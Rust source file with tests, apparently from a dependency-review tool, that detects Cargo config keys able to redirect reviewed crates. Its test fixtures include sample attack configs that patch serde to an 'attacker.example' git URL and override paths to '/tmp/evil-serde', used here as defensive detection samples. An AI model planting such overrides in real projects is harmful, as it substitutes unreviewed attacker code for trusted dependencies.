use thiserror::Error;

/// Cargo config keys that let `.cargo/config.toml` (or legacy
/// `.cargo/config`) repoint an already-reviewed crate name away from its
/// reviewed source without touching `Cargo.toml` or `Cargo.lock`:
/// `[source.*]` source replacement, config-defined `[patch.*]` (stable since
/// Rust 1.56, works exactly like a manifest `[patch]`), and top-level
/// `paths` dependency overrides. The mere presence of any of these tables
/// must be treated as a fail-closed finding wherever reviewed families are
/// active.
const SOURCE_OVERRIDE_KEYS: [&str; 3] = ["source", "patch", "paths"];

/// Returns the first cargo config key from [`SOURCE_OVERRIDE_KEYS`] present
/// in the given `.cargo/config.toml` text, if any.
pub fn cargo_config_source_override_key(
    text: &str,
) -> Result<Option<&'static str>, CargoConfigError> {
    let value: toml::Value = toml::from_str(text).map_err(CargoConfigError::Parse)?;
    let table = value.as_table().ok_or(CargoConfigError::ExpectedTable)?;

    Ok(SOURCE_OVERRIDE_KEYS
        .into_iter()
        .find(|key| table.contains_key(*key)))
}

#[derive(Debug, Error)]
pub enum CargoConfigError {
    #[error("unable to parse cargo config: {0}")]
    Parse(#[source] toml::de::Error),
    #[error("cargo config root must be a TOML table")]
    ExpectedTable,
}

#[cfg(test)]
mod tests {
    use super::{CargoConfigError, cargo_config_source_override_key};

    #[test]
    fn detects_source_replacement_tables() {
        let key = cargo_config_source_override_key(
            r#"
[source.crates-io]
replace-with = "internal-mirror"

[source.internal-mirror]
registry = "https://internal.example/index"
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, Some("source"));
    }

    #[test]
    fn detects_config_defined_patch_tables() {
        let key = cargo_config_source_override_key(
            r#"
[patch.crates-io]
serde = { git = "https://attacker.example/serde" }
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, Some("patch"));
    }

    #[test]
    fn detects_top_level_paths_overrides() {
        let key = cargo_config_source_override_key(
            r#"
paths = ["/tmp/evil-serde"]
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, Some("paths"));
    }

    #[test]
    fn does_not_flag_config_without_an_override_key() {
        let key = cargo_config_source_override_key(
            r#"
[net]
retry = 3
"#,
        )
        .expect("cargo config should parse");

        assert_eq!(key, None);
    }

    #[test]
    fn rejects_unparseable_cargo_config() {
        let error =
            cargo_config_source_override_key("not = valid = toml").expect_err("config should fail");

        assert!(matches!(error, CargoConfigError::Parse(_)));
    }
}
